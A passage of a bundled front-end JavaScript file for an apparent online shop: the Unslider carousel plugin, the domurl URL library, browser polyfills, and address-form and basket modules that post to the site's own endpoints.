        self.$container.css(prop, (self.total * 100) + '%').addClass(self.prefix + 'carousel')
        self.$slides.css(prop, (100 / self.total) + '%')
      }
    }

    //  Start our autoplay
    self.start = function () {
      self.interval = setTimeout(function () {
        //  Move on to the next slide
        self.next()

        //  If we've got autoplay set up
        //  we don't need to keep starting
        //  the slider from within our timeout
        //  as .animate() calls it for us
      }, self.options.delay)

      return self
    }

    //  And pause our timeouts
    //  and force stop the slider if needed
    self.stop = function () {
      clearTimeout(self.interval)

      return self
    }

    //  Set up our navigation
    self.initNav = function () {
      var $nav = $('<nav class="' + self.prefix + 'nav"><ol /></nav>')

      //  Build our click navigation item-by-item
      self.$slides.each(function (key) {
        //  If we've already set a label, let's use that
        //  instead of generating one
        var label = this.getAttribute('data-nav') || key + 1

        //  Listen to any callback functions
        if ($.isFunction(self.options.nav)) {
          label = self.options.nav.call(self.$slides.eq(key), key, label)
        }

        //  And add it to our navigation item
        $nav.children('ol').append('<li data-slide="' + key + '">' + label + '</li>')
      })

      //  Keep a copy of the nav everywhere so we can use it
      self.$nav = $nav.insertAfter(self.$context)

      //  Now our nav is built, let's add it to the slider and bind
      //  for any click events on the generated links
      self.$nav.find('li').on('click' + self.eventSuffix, function () {
        //  Cache our link and set it to be active
        var $me = $(this).addClass(self.options.activeClass)

        //  Set the right active class, remove any other ones
        $me.siblings().removeClass(self.options.activeClass)

        //  Move the slide
        self.animate($me.attr('data-slide'))
      })
    }

    //  Set up our left-right arrow navigation
    //  (Not keyboard arrows, prev/next buttons)
    self.initArrows = function () {
      if (self.options.arrows === true) {
        self.options.arrows = self.defaults.arrows
      }

      //  Loop our options object and bind our events
      $.each(self.options.arrows, function (key, val) {
        //  Add our arrow HTML and bind it
        self.$arrows.push(
            $(val).insertAfter(self.$context).on('click' + self.eventSuffix, self[key])
        )
      })
    }

    //  Set up our keyboad navigation
    //  Allow binding to multiple keycodes
    self.initKeys = function () {
      if (self.options.keys === true) {
        self.options.keys = self.defaults.keys
      }

      $(document).on('keyup' + self.eventSuffix, function (e) {
        $.each(self.options.keys, function (key, val) {
          if (e.which === val) {
            $.isFunction(self[key]) && self[key].call(self)
          }
        })
      })
    }

    //  Requires jQuery.event.swipe
    //  -> stephband.info/jquery.event.swipe
    self.initSwipe = function () {
      var width = self.$slides.width()

      //  We don't want to have a tactile swipe in the slider
      //  in the fade animation, as it can cause some problems
      //  with layout, so we'll just disable it.
      if (self.options.animation !== 'fade') {

        self.$container.on({

          movestart: function (e) {
            //  If the movestart heads off in a upwards or downwards
            //  direction, prevent it so that the browser scrolls normally.
            if ((e.distX > e.distY && e.distX < -e.distY) || (e.distX < e.distY && e.distX > -e.distY)) {
              return !!e.preventDefault()
            }

            self.$container.css('position', 'relative')
          },

          move: function (e) {
            self.$container.css('left', -(100 * self.current) + (100 * e.distX / width) + '%')
          },

          moveend: function (e) {
            // Check if swiped distance is greater than threshold.
            // If yes slide to next/prev slide. If not animate to
            // starting point.

            if ((Math.abs(e.distX) / width) > self.options.swipeThreshold) {

              self[e.distX < 0 ? 'next' : 'prev']()
            }
            else {

              self.$container.animate({ left: -(100 * self.current) + '%' }, self.options.speed / 2)
            }
          }
        })
      }
    }

    //  Infinite scrolling is a massive pain in the arse
    //  so we need to create a whole bloody function to set
    //  it up. Argh.
    self.initInfinite = function () {
      var pos = ['first', 'last']

      $.each(pos, function (index, item) {
        self.$slides.push.apply(
            self.$slides,

            //  Exclude all cloned slides and call .first() or .last()
            //  depending on what `item` is.
            self.$slides.filter(':not(".' + self._ + '-clone")')[item]()

            //  Make a copy of it and identify it as a clone
                .clone().addClass(self._ + '-clone')

                //  Either insert before or after depending on whether we're
                //  the first or last clone
                ['insert' + (index === 0 ? 'After' : 'Before')](
                //  Return the other element in the position array
                //  if item = first, return "last"
                self.$slides[pos[~~!index]]()
            )
        )
      })
    }

    //  Remove any trace of arrows
    //  Loop our array of arrows and use jQuery to remove
    //  It'll unbind any event handlers for us
    self.destroyArrows = function () {
      $.each(self.$arrows, function (i, $arrow) {
        $arrow.remove()
      })
    }

    //  Remove any swipe events and reset the position
    self.destroySwipe = function () {
      //  We bind to 4 events, so we'll unbind those
      self.$container.off('movestart move moveend')
    }

    //  Unset the keyboard navigation
    //  Remove the handler
    self.destroyKeys = function () {
      //  Remove the event handler
      $(document).off('keyup' + self.eventSuffix)
    }

    self.setIndex = function (to) {
      if (to < 0) {
        to = self.total - 1
      }

      self.current = Math.min(Math.max(0, to), self.total - 1)

      if (self.options.nav) {
        self.$nav.find('[data-slide="' + self.current + '"]')._active(self.options.activeClass)
      }

      self.$slides.eq(self.current)._active(self.options.activeClass)

      return self
    }

    //  Despite the name, this doesn't do any animation - since there's
    //  now three different types of animation, we let this method delegate
    //  to the right type, keeping the name for backwards compat.
    self.animate = function (to, dir) {
      //  Animation shortcuts
      //  Instead of passing a number index, we can now
      //  use .data('unslider').animate('last');
      //  or .unslider('animate:last')
      //  to go to the very last slide
      if (to === 'first') to = 0
      if (to === 'last') to = self.total

      //  Don't animate if it's not a valid index
      if (isNaN(to)) {
        return self
      }

      if (self.options.autoplay) {
        self.stop().start()
      }

      self.setIndex(to)

      //  Add a callback method to do stuff with
      self.$context.trigger(self._ + '.change', [to, self.$slides.eq(to)])

      //  Delegate the right method - everything's named consistently
      //  so we can assume it'll be called "animate" +
      var fn = 'animate' + $._ucfirst(self.options.animation)

      //  Make sure it's a valid animation method, otherwise we'll get
      //  a load of bug reports that'll be really hard to report
      if ($.isFunction(self[fn])) {
        self[fn](self.current, dir)
      }

      return self
    }

    //  Shortcuts for animating if we don't know what the current
    //  index is (i.e back/forward)
    //  For moving forward we need to make sure we don't overshoot.
    self.next = function () {
      var target = self.current + 1

      //  If we're at the end, we need to move back to the start
      if (target >= self.total) {
        target = 0
      }

      return self.animate(target, 'next')
    }

    //  Previous is a bit simpler, we can just decrease the index
    //  by one and check if it's over 0.
    self.prev = function () {
      return self.animate(self.current - 1, 'prev')
    }

    //  Our default animation method, the old-school left-to-right
    //  horizontal animation
    self.animateHorizontal = function (to) {
      var prop = 'left'

      //  Add RTL support, slide the slider
      //  the other way if the site is right-to-left
      if (self.$context.attr('dir') === 'rtl') {
        prop = 'right'
      }

      if (self.options.infinite) {
        //  So then we need to hide the first slide
        self.$container.css('margin-' + prop, '-100%')
      }

      return self.slide(prop, to)
    }

    //  The same animation methods, but vertical support
    //  RTL doesn't affect the vertical direction so we
    //  can just call as is
    self.animateVertical = function (to) {
      self.options.animateHeight = true

      //  Normal infinite CSS fix doesn't work for
      //  vertical animation so we need to manually set it
      //  with pixels. Ah well.
      if (self.options.infinite) {
        self.$container.css('margin-top', -self.$slides.outerHeight())
      }

      return self.slide('top', to)
    }

    //  Actually move the slide now
    //  We have to pass a property to animate as there's
    //  a few different directions it can now move, but it's
    //  otherwise unchanged from before.
    self.slide = function (prop, to) {
      //  If we want to change the height of the slider
      //  to match the current slide, you can set
      //  {animateHeight: true}
      self.animateHeight(to)

      //  For infinite sliding we add a dummy slide at the end and start
      //  of each slider to give the appearance of being infinite
      if (self.options.infinite) {
        var dummy

        //  Going backwards to last slide
        if (to === self.total - 1) {
          //  We're setting a dummy position and an actual one
          //  the dummy is what the index looks like
          //  (and what we'll silently update to afterwards),
          //  and the actual is what makes it not go backwards
          dummy = self.total - 3
          to = -1
        }

        //  Going forwards to first slide
        if (to === self.total - 2) {
          dummy = 0
          to = self.total - 2
        }

        //  If it's a number we can safely set it
        if (typeof dummy === 'number') {
          self.setIndex(dummy)

          //  Listen for when the slide's finished transitioning so
          //  we can silently move it into the right place and clear
          //  this whole mess up.
          self.$context.on(self._ + '.moved', function () {
            if (self.current === dummy) {
              self.$container.css(prop, -(100 * dummy) + '%').off(self._ + '.moved')
            }
          })
        }
      }

      //  We need to create an object to store our property in
      //  since we don't know what it'll be.
      var obj = {}

      //  Manually create it here
      obj[prop] = -(100 * to) + '%'

      //  And animate using our newly-created object
      return self._move(self.$container, obj)
    }

    //  Fade between slides rather than, uh, sliding it
    self.animateFade = function (to) {
      //  If we want to change the height of the slider
      //  to match the current slide, you can set
      //  {animateHeight: true}
      self.animateHeight(to)

      var $active = self.$slides.eq(to).addClass(self.options.activeClass)

      //  Toggle our classes
      self._move($active.siblings().removeClass(self.options.activeClass), { opacity: 0 })
      self._move($active, { opacity: 1 }, false)
    }

    // Animate height of slider
    self.animateHeight = function (to) {
      //  If we want to change the height of the slider
      //  to match the current slide, you can set
      //  {animateHeight: true}
      if (self.options.animateHeight) {
        self._move(self.$context, { height: self.$slides.eq(to).outerHeight() }, false)
      }
    }

    self._move = function ($el, obj, callback, speed) {
      if (callback !== false) {
        callback = function () {
          self.$context.trigger(self._ + '.moved')
        }
      }

      return $el._move(obj, speed || self.options.speed, self.options.easing, callback)
    }

    //  Allow daisy-chaining of methods
    return self.init(options)
  }

  //  Internal (but global) jQuery methods
  //  They're both just helpful types of shorthand for
  //  anything that might take too long to write out or
  //  something that might be used more than once.
  $.fn._active = function (className) {
    return this.addClass(className).siblings().removeClass(className)
  }

  //  The equivalent to PHP's ucfirst(). Take the first
  //  character of a string and make it uppercase.
  //  Simples.
  $._ucfirst = function (str) {
    //  Take our variable, run a regex on the first letter
    return (str + '').toLowerCase().replace(/^./, function (match) {
      //  And uppercase it. Simples.
      return match.toUpperCase()
    })
  }

  $.fn._move = function () {
    this.stop(true, true)
    return $.fn[$.fn.velocity ? 'velocity' : 'animate'].apply(this, arguments)
  }

  //  And set up our jQuery plugin
  $.fn.unslider = function (opts) {
    return this.each(function () {
      var $this = $(this)

      //  Allow usage of .unslider('function_name')
      //  as well as using .data('unslider') to access the
      //  main Unslider object
      if (typeof opts === 'string' && $this.data('unslider')) {
        opts = opts.split(':')

        var call = $this.data('unslider')[opts[0]]

        //  Do we have arguments to pass to the string-function?
        if ($.isFunction(call)) {
          return call.apply($this, opts[1] ? opts[1].split(',') : null)
        }
      }

      return $this.data('unslider', new $.Unslider($this, opts))
    })
  }
}));
/*!
 * Lightweight URL manipulation with JavaScript
 * https://github.com/Mikhus/domurl
 * Version 2.1 (13/7/2016)
 * @license MIT
 * @author Mykhailo Stadnyk <mikhus@gmail.com>
 */
(function (ns) {
  'use strict'

  // mapping between what we want and <a> element properties
  var map = {
    protocol: 'protocol',
    host: 'hostname',
    port: 'port',
    path: 'pathname',
    query: 'search',
    hash: 'hash'
  }

  // jscs: disable
  /**
   * default ports as defined by http://url.spec.whatwg.org/#default-port
   * We need them to fix IE behavior, @see https://github.com/Mikhus/jsurl/issues/2
   */
      // jscs: enable
  var defaultPorts = {
        ftp: 21,
        gopher: 70,
        http: 80,
        https: 443,
        ws: 80,
        wss: 443
      }

  function parse (self, url) {
    var currUrl, link, i, auth

    if (typeof document === 'undefined' && typeof require === 'function') {
      currUrl = 'file://' +
          (process.platform.match(/^win/i) ? '/' : '') +
          require('fs').realpathSync('.')

      if (url && url.charAt(0) !== '/' && !url.match(/^\w+:\/\//)) {
        url = currUrl + require('path').sep + url
      }

      link = require('url').parse(url || currUrl)
    }

    else {
      currUrl = document.location.href
      link = document.createElement('a')
      link.href = url || currUrl
    }

    auth = (url || currUrl).match(/\/\/(.*?)(?::(.*?))?@/) || []

    for (i in map) {
      self[i] = link[map[i]] || ''
    }

    // fix-up some parts
    self.protocol = self.protocol.replace(/:$/, '')
    self.query = self.query.replace(/^\?/, '')
    self.hash = decode(self.hash.replace(/^#/, ''))
    self.user = decode(auth[1] || '')
    self.pass = decode(auth[2] || '')
    self.port = (
        // loosely compare because port can be a string
        defaultPorts[self.protocol] == self.port || self.port == 0
    ) ? '' : self.port // IE fix, Android browser fix

    if (!self.protocol && !/^([a-z]+:)?\/\/\/?/.test(url)) {
      // is IE and path is relative
      var base = new DomUrl(currUrl.match(/(.*\/)/)[0])
      var basePath = base.path.split('/')
      var selfPath = self.path.split('/')
      var props = ['protocol', 'user', 'pass', 'host', 'port']
      var s = props.length

      basePath.pop()

      for (i = 0; i < s; i++) {
        self[props[i]] = base[props[i]]
      }

      while (selfPath[0] == '..') { // skip all "../
        basePath.pop()
        selfPath.shift()
      }

      self.path =
          (url.charAt(0) != '/' ? basePath.join('/') : '') +
          '/' + selfPath.join('/')

    }

    else {
      // fix absolute URL's path in IE
      self.path = self.path.replace(/^\/?/, '/')
    }

    self.paths((self.path.charAt(0) == '/' ?
        self.path.slice(1) : self.path).split('/')
    )

    self.query = new QueryString(self.query)
  }

  function encode (s) {
    return encodeURIComponent(s).replace(/'/g, '%27')
  }

  function decode (s) {
    s = s.replace(/\+/g, ' ')

    s = s.replace(/%([ef][0-9a-f])%([89ab][0-9a-f])%([89ab][0-9a-f])/gi,
        function (code, hex1, hex2, hex3) {
          var n1 = parseInt(hex1, 16) - 0xE0
          var n2 = parseInt(hex2, 16) - 0x80

          if (n1 === 0 && n2 < 32) {
            return code
          }

          var n3 = parseInt(hex3, 16) - 0x80
          var n = (n1 << 12) + (n2 << 6) + n3

          if (n > 0xFFFF) {
            return code
          }

          return String.fromCharCode(n)
        }
    )

    s = s.replace(/%([cd][0-9a-f])%([89ab][0-9a-f])/gi,
        function (code, hex1, hex2) {
          var n1 = parseInt(hex1, 16) - 0xC0

          if (n1 < 2) {
            return code
          }

          var n2 = parseInt(hex2, 16) - 0x80

          return String.fromCharCode((n1 << 6) + n2)
        }
    )

    return s.replace(/%([0-7][0-9a-f])/gi,
        function (code, hex) {
          return String.fromCharCode(parseInt(hex, 16))
        }
    )
  }

  /**
   * Class QueryString
   *
   * @param {string} qs - string representation of QueryString
   * @constructor
   */
  function QueryString (qs) {
    var re = /([^=&]+)(=([^&]*))?/g
    var match

    while ((match = re.exec(qs))) {
      var key = decodeURIComponent(match[1].replace(/\+/g, ' '))
      var value = match[3] ? decode(match[3]) : ''

      if (!(this[key] === undefined || this[key] === null)) {
        if (!(this[key] instanceof Array)) {
          this[key] = [this[key]]
        }

        this[key].push(value)
      }

      else {
        this[key] = value
      }
    }
  }

  /**
   * Converts QueryString object back to string representation
   *
   * @returns {string}
   */
  QueryString.prototype.toString = function () {
    var s = ''
    var e = encode
    var i, ii

    for (i in this) {
      if (this[i] instanceof Function || this[i] === null) {
        continue
      }

      if (this[i] instanceof Array) {
        var len = this[i].length

        if (len) {
          for (ii = 0; ii < len; ii++) {
            s += s ? '&' : ''
            s += e(i) + '=' + e(this[i][ii])
          }
        }

        else {
          // parameter is an empty array, so treat as
          // an empty argument
          s += (s ? '&' : '') + e(i) + '='
        }
      }

      else {
        s += s ? '&' : ''
        s += e(i) + '=' + e(this[i])
      }
    }

    return s
  }

  /**
   * Class DomUrl
   *
   * @param {string} [url] - string URL representation
   * @constructor
   */
  function DomUrl (url) {
    parse(this, url)
  }

  /**
   * Clears QueryString, making it contain no params at all
   *
   * @returns {DomUrl}
   */
  DomUrl.prototype.clearQuery = function () {
    for (var key in this.query) {
      if (!(this.query[key] instanceof Function)) {
        delete this.query[key]
      }
    }

    return this
  }

  /**
   * Returns total number of parameters in QueryString
   *
   * @returns {number}
   */
  DomUrl.prototype.queryLength = function () {
    var count = 0
    var key

    for (key in this) {
      if (!(this[key] instanceof Function)) {
        count++
      }
    }

    return count
  }

  /**
   * Returns true if QueryString contains no parameters, false otherwise
   *
   * @returns {boolean}
   */
  DomUrl.prototype.isEmptyQuery = function () {
    return this.queryLength() === 0
  }

  /**
   *
   * @param {Array} [paths] - an array pf path parts (if given will modify
   *                          DomUrl.path property
   * @returns {Array} - an array representation of the DomUrl.path property
   */
  DomUrl.prototype.paths = function (paths) {
    var prefix = ''
    var i = 0
    var s

    if (paths && paths.length && paths + '' !== paths) {
      if (this.isAbsolute()) {
        prefix = '/'
      }

      for (s = paths.length; i < s; i++) {
        paths[i] = !i && paths[i].match(/^\w:$/) ? paths[i] :
            encode(paths[i])
      }

      this.path = prefix + paths.join('/')
    }

    paths = (this.path.charAt(0) === '/' ?
        this.path.slice(1) : this.path).split('/')

    for (i = 0, s = paths.length; i < s; i++) {
      paths[i] = decode(paths[i])
    }

    return paths
  }

  /**
   * Performs URL-specific encoding of the given string
   *
   * @method DomUrl#encode
   * @param {string} s - string to encode
   * @returns {string}
   */
  DomUrl.prototype.encode = encode

  /**
   * Performs URL-specific decoding of the given encoded string
   *
   * @method DomUrl#decode
   * @param {string} s - string to decode
   * @returns {string}
   */
  DomUrl.prototype.decode = decode

  /**
   * Checks if current URL is an absolute resource locator (globally absolute
   * or absolute path to current server)
   *
   * @returns {boolean}
   */
  DomUrl.prototype.isAbsolute = function () {
    return this.protocol || this.path.charAt(0) === '/'
  }

  /**
   * Returns string representation of current DomUrl object
   *
   * @returns {string}
   */
  DomUrl.prototype.toString = function () {
    return (
        (this.protocol && (this.protocol + '://')) +
        (this.user && (
            encode(this.user) + (this.pass && (':' + encode(this.pass))
            ) + '@')) +
        (this.host && this.host) +
        (this.port && (':' + this.port)) +
        (this.path && this.path) +
        (this.query.toString() && ('?' + this.query)) +
        (this.hash && ('#' + encode(this.hash)))
    )
  }

  ns[ns.exports ? 'exports' : 'DomUrl'] = DomUrl
}(typeof module !== 'undefined' && module.exports ? module : window));
/*****************************
 Polyfills
 *****************************/

(function () {
  // -------------------------
  // Array
  // -------------------------

  // Array.find
  if (!Array.prototype.find) {
    Array.prototype.find = function (predicate) {
      if (this == null) {
        return undefined
        //throw new TypeError('Array.prototype.find called on null or undefined');
      }
      if (typeof predicate !== 'function') {
        return undefined
        //throw new TypeError('predicate must be a function');
      }
      var list = Object(this)
      var length = list.length >>> 0
      var thisArg = arguments[1]
      var value

      for (var i = 0; i < length; i++) {
        value = list[i]
        if (predicate.call(thisArg, value, i, list)) {
          return value
        }
      }
      return undefined
    }
  }

  // -------------------------
  // String
  // -------------------------

  // String.startsWith
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0
      return this.indexOf(searchString, position) === position
    }
  }

  // -------------------------
  // Object
  // -------------------------

  // Object.assign
  if (typeof Object.assign != 'function') {
    Object.assign = function (target, varArgs) { // .length of function is 2
      'use strict'
      if (target == null) { // TypeError if undefined or null
        throw new TypeError('Cannot convert undefined or null to object')
      }

      var to = Object(target)

      for (var index = 1; index < arguments.length; index++) {
        var nextSource = arguments[index]

        if (nextSource != null) { // Skip over if undefined or null
          for (var nextKey in nextSource) {
            // Avoid bugs when hasOwnProperty is shadowed
            if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
              to[nextKey] = nextSource[nextKey]
            }
          }
        }
      }
      return to
    }
  }

  // -------------------------
  // Number
  // -------------------------

  // Number.isInteger
  Number.isInteger = Number.isInteger || function (value) {
    return typeof value === 'number' && isFinite(value) && Math.floor(value) === value
  }


  // -------------------------
  // arr.includes()
  // -------------------------

  // https://tc39.github.io/ecma262/#sec-array.prototype.includes

  if (!Array.prototype.includes) {
    Object.defineProperty(Array.prototype, 'includes', {
      value: function(searchElement, fromIndex) {

        if (this == null) {
          throw new TypeError('"this" is null or not defined');
        }

        // 1. Let O be ? ToObject(this value).
        var o = Object(this);

        // 2. Let len be ? ToLength(? Get(O, "length")).
        var len = o.length >>> 0;

        // 3. If len is 0, return false.
        if (len === 0) {
          return false;
        }

        // 4. Let n be ? ToInteger(fromIndex).
        //    (If fromIndex is undefined, this step produces the value 0.)
        var n = fromIndex | 0;

        // 5. If n ≥ 0, then
        //  a. Let k be n.
        // 6. Else n < 0,
        //  a. Let k be len + n.
        //  b. If k < 0, let k be 0.
        var k = Math.max(n >= 0 ? n : len - Math.abs(n), 0);

        function sameValueZero(x, y) {
          return x === y || (typeof x === 'number' && typeof y === 'number' && isNaN(x) && isNaN(y));
        }

        // 7. Repeat, while k < len
        while (k < len) {
          // a. Let elementK be the result of ? Get(O, ! ToString(k)).
          // b. If SameValueZero(searchElement, elementK) is true, return true.
          if (sameValueZero(o[k], searchElement)) {
            return true;
          }
          // c. Increase k by 1.
          k++;
        }

        // 8. Return false
        return false;
      }
    })
  }

})(window);

/*****************************
 Address
 *****************************/
var Address = (function () {
  var streets,
      selected_street

  var toggleBlock = function (block, status) {
    block.toggle(status)
    block.find('input', 'select').prop('disabled', !status)
  }

  var toggleManualAddress = function (status) {
    toggleBlock($j('#manual_address'), status)
  }

  var toggleStreetDropdown = function (status) {
    toggleBlock($j('#street_dropdown'), status)
    $j('#street_dropdown_note').toggle(status)
  }

  var toggleCommonControls = function (status) {
    $j('#building_unit_floor_door').toggle(status)
    $j('#phone_nb').toggle(status)
    $j('#delivery_information_block').toggle(status)
  }

  var postalCodeSelected = function () {
    $j('#buyer_street_id').val('')

    var postal_code_id = $j('#buyer_postal_code_id').val()

    if (postal_code_id == '') {
      toggleManualAddress(false)
      toggleStreetDropdown(false)
      toggleCommonControls(false)

    } else {
      toggleCommonControls(true)

      var postal_streets = streets[postal_code_id]
      if (postal_streets == null || postal_streets.length == 0) {
        toggleManualAddress(true)
        toggleStreetDropdown(false)

      } else {
        toggleManualAddress(false)
        toggleStreetDropdown(true)

        $j('#buyer_street_id').empty()
        $j('#buyer_street_id').append($j('<option value="">&nbsp;</option>'))
        $j.each(postal_streets, function () {
          var name = (this['type'] ? this['type'] + ' ' : '') + this['name']
          $j('#buyer_street_id').append(
              $j('<option></option>').attr('value', this['value']).text(name)
          )
        })
        $j('#buyer_street_id_flexselect').remove()
        $j('#buyer_street_id').val(selected_street)
        $j('#buyer_street_id').flexselect()
        $j('#buyer_street_id_flexselect').show()
      }
    }
  }

  var init = function (_streets, _selected_street) {
    streets = _streets
    selected_street = _selected_street

    postalCodeSelected()
    $j('#buyer_postal_code_id').change(postalCodeSelected)
  }

  return {
    init: init
  }
}())
/*****************************
 Address Form Helper
 *****************************/
var HelperAddressesForm = (function () {
    var changeDeliveryMethod = function (delivery_method, container_delivery_address, container_collection_information) {
        if (delivery_method == 'delivery') {
            $j(container_delivery_address).show();
            $j(container_collection_information).hide();
        } else if (delivery_method == 'collection') {
            $j(container_delivery_address).hide();
            $j(container_collection_information).show();
        } else {
            $j(container_delivery_address).hide();
            $j(container_collection_information).hide();
        }
    }

    return {
        changeDeliveryMethod: changeDeliveryMethod,
    }
}());/*****************************
 Basket
 *****************************/
var Basket = (function () {
  // Busy indicator - show
  function showBusy () {
    $j('#busy').show()
  }

  // Busy indicator - hide
  function hideBusy () {
    $j('#busy').hide()
  }

  var updateBasketOrPopup = function (page, data) {
    if (page == 'basket' || page == 'step_basket') {
      $j('#basket-holder').html(data)
      return $j('#basket-holder')
    } else {
      $j('#popup-holder').html(data)
      return $j('#popup-holder')
    }
  }

  // AJAX operations
  var ajaxPost = function (url, page) {
    showBusy()
    $j.ajax({
      url: url,
      type: 'post',
      data: 'page=' + encodeURIComponent(page)
    }).done(function (data) {
      updateBasketOrPopup(page, data)
    })
  }

  var ajaxPostForm = function (url, form, page, sku) {
    ajaxPostFormWithCallback(url, form, page, sku, $j.noop)
  }

  var ajaxPostFormWithCallback = function (url, form, page, sku, callback) {
    showBusy()
    $j.ajax({
      url: url,
      type: 'post',
      data: $j(form).serialize() +
          '&page=' + encodeURIComponent(page) +
          '&basket_page=' + encodeURIComponent(basketPage()) +
          (sku ? '&item[sku]=' + encodeURIComponent(sku) : '')
    }).done(function (data) {
      var basket = updateBasketOrPopup(page, data)
      var new_key = basket.find('[data-edited]').attr('data-key')
      $j(form).attr('data-key', new_key)
      if (callback) callback()
    })
  }

  var synchronousAjaxPostForm = function (url, form, page, sku) {
    showBusy()
    $j.ajax({
      url: url,
      type: 'post',
      async: false,
      data: $j(form).serialize() + '&page=' + encodeURIComponent(page) + (sku ? '&item[sku]=' + encodeURIComponent(sku) : '')
    }).done(function (data) {
      var basket = updateBasketOrPopup(page, data)
      var new_key = basket.find('[data-edited]').attr('data-key')
      $j(form).attr('data-key', new_key)
    })
  }

  var ajaxGet = function (url, page) {
    showBusy()
    $j.ajax({
      url: Util.addKeyValueToURL(url, 'page', encodeURIComponent(page)),
      type: 'get'
    }).done(function (data) {
      updateBasketOrPopup(page, data)
    })
  }

  // Coupon codes
  var selectedCouponProductHandle = function () {
    return $j('#coupon_form option:selected').val().split('###')[0]
  }

  var selectedCouponSkuHandle = function () {
    return $j('#coupon_form option:selected').val().split('###')[1]
  }

  var createItemWithPageAndCallback = function (_form, item_name, page, callback) {
    var form = $j(_form),
        product = form.attr('data-product'),
        sku = form.attr('data-sku')

    var current_page_path = form.attr('data-current-page-path')
    var is_accessory = current_page_path == '/accessories' ? '/?accessory=true' : ''
    var url = '/basket_items/create/' + product + is_accessory

    Flash.itemAdded(form, item_name)
    if (callback) {
      ajaxPostFormWithCallback(url, form, page, sku, callback)
    } else {
      ajaxPostForm(url, form, page, sku)
    }
  }

  var synchronousCreateItemWithPage = function (_form, item_name, page) {
    var form = $j(_form),
        product = form.attr('data-product'),
        sku = form.attr('data-sku'),
        url = '/basket_items/create/' + product
    Flash.itemAdded(form, item_name)
    synchronousAjaxPostForm(url, form, page, sku)
  }

  // This method creates multiple items, with the correct sku but currently with no option. Needs to be improved.
  var createMultipleItemsWithPageAndCallback = function (_forms, page, callback) {
    showBusy()
    var forms = $j(_forms),
        url = '/basket_items/create_multiple' + '?page=' + encodeURIComponent(page),
        data = ''

    $j.each(forms, function () {
      var form = $j(this),
          product = form.attr('data-product'),
          sku = form.attr('data-sku')
      data = data +
          '&items[][product_handle]=' + encodeURIComponent(product) + (sku ? '&items[][item][sku]=' + encodeURIComponent(sku) : '')
    })
    $j.ajax({
      url: url,
      type: 'post',
      data: data
    }).done(function (data) {
      updateBasketOrPopup(page, data)
      if (callback) callback()
    })
  }

  var basketPage = function () {
    return $j('.basket_step-basket').size() > 0 ? 'step_basket' : 'basket'
  }

  var changeDateTimeMethod = function (target, query) {
    if (target != 'basket' && target != 'step_basket') return console.error('Invalid target: ' + target)
    Basket.showBusy()
    $j.ajax({
      url: '/' + target + '?' + query + '&page=' + target,
      type: 'get'
    }).done(function (data) {
      Basket.updateContent(data)
    })
  }

  return {
    // ------------------
    // Single items
    // ------------------
    newItem: function (_form, target) {
      var form = $j(_form),
          product = form.attr('data-product'),
          sku = form.attr('data-sku'),
          url = '/basket_items/new/' + product
      if (target == 'popup') {
        ajaxPostForm(url, form, 'popup_item', sku)
      } else {
        if (form && form.serialize().length > 0) {
          var form_data = form.serialize()
        }
        var parameters = 'page=' + target + (form_data ? '&' + form_data : '') + (sku ? '&item[sku]=' + encodeURIComponent(sku) : '')
        Util.redirect(Util.addParametersToURL(url, parameters))
      }
    },

    newItemNoForm: function (product_handle, sku_handle, target) {
      var url = '/basket_items/new/' + product_handle
      url = Util.addKeyValueToURL(url, 'page', target)
      if (sku_handle) url = Util.addKeyValueToURL(url, 'item[sku]', sku_handle)
      Util.redirect(url)
    },

    createItemWithCallback: function (_form, item_name, page, callback) {
      createItemWithPageAndCallback(_form, item_name, page, callback)
    },

    synchronousCreateItemInStepBasket: function (_form, item_name) {
      synchronousCreateItemWithPage(_form, item_name, 'step_basket')
    },

    synchronousCreateMultipleItems: function (_forms, _item_name) {
      var last_id = _forms.length - 1
      var item_name = null
      for (var form_id in _forms) {
        if (form_id == last_id) item_name = _item_name
        synchronousCreateItemWithPage(_forms[form_id], item_name, 'basket')
      }
    },

    editItem: function (url, target) {
      if (target == 'popup') {
        ajaxPost(url, 'popup_item')
      } else {
        Util.redirect(Util.addKeyValueToURL(url, 'page', target))
      }
    },

    updateItemWithCallback: function (_form, item_name, page, callback) {
      var form = $j(_form),
          key = form.attr('data-key'),
          sku = form.attr('data-sku'),
          url = '/basket_items/update/' + key
      Flash.itemUpdated(item_name)
      ajaxPostFormWithCallback(url, form, page, sku, callback)
    },

    deleteItem: function (basket_item_key, item_name, is_free_accessory) {
      is_free_accessory = is_free_accessory || 'false';
      var url = '/basket_items/destroy/' + basket_item_key + '/?free_accessory=' + is_free_accessory
      Flash.itemRemoved(item_name)
      ajaxGet(url, 'basket')
    },

    // ------------------
    // Items group
    // ------------------
    createMultipleItemsWithCallback: function (_forms, callback) {
      createMultipleItemsWithPageAndCallback(_forms, 'basket', callback)
    },

    // ------------------
    // Deals
    // ------------------
    newDeal: function (_form, target) {
      var form = $j(_form),
          product = form.attr('data-product'),
          url = Util.addKeyValueToURL('/deal_bags/new', 'product_handle', product)

      if (target == 'popup') {
        ajaxPost(url, 'popup_deal')

      } else {
        url = Util.addKeyValueToURL(url, 'page', target)
        url = Util.addKeyValueToURL(url, 'redirect_to_page', Util.currentPage())
        Util.redirect(url)
      }
    },

    createDealWithCallback: function (_form, deal_name, page, callback) {
      var form = $j(_form),
          product = form.attr('data-product'),
          url = Util.addKeyValueToURL('/deal_bags/create', 'product_handle', product)
      Flash.itemAdded(form, deal_name)
      ajaxPostFormWithCallback(url, form, page, null, callback)
    },

    editDeal: function (url, target) {
      if (target == 'popup') {
        ajaxPost(url, 'popup_deal')
      } else {
        Util.redirect(Util.addKeyValueToURL(url, 'page', target))
      }
    },

    updateDealWithCallback: function (_form, deal_name, page, callback) {
      var form = $j(_form),
          key = form.attr('data-key'),
          url = '/deal_bags/update/' + key
      Flash.itemUpdated(deal_name)
      ajaxPostFormWithCallback(url, form, page, null, callback)
    },

    deleteDeal: function (url, deal_name) {
      ajaxPost(url, 'basket')
      Flash.itemRemoved(deal_name)
    },

    // ------------------
    // Deal items
    // ------------------
    editDealItem: function (url, target) {
      if (target == 'popup') {
        ajaxPost(url, 'popup_deal_item')
      } else {
        Util.redirect(Util.addKeyValueToURL(url, 'page', target))
      }
    },

    updateDealItemWithCallback: function (_form, item_name, page, callback) {
      var form = $j(_form),
          key = form.attr('data-key'),
          sku = form.attr('data-sku'),
          url = '/deal_basket_items/update/' + key
      Flash.itemUpdated(item_name)
      ajaxPostFormWithCallback(url, form, page, sku, callback)
    },

    deleteDealItem: function (url, deal_item_name) {
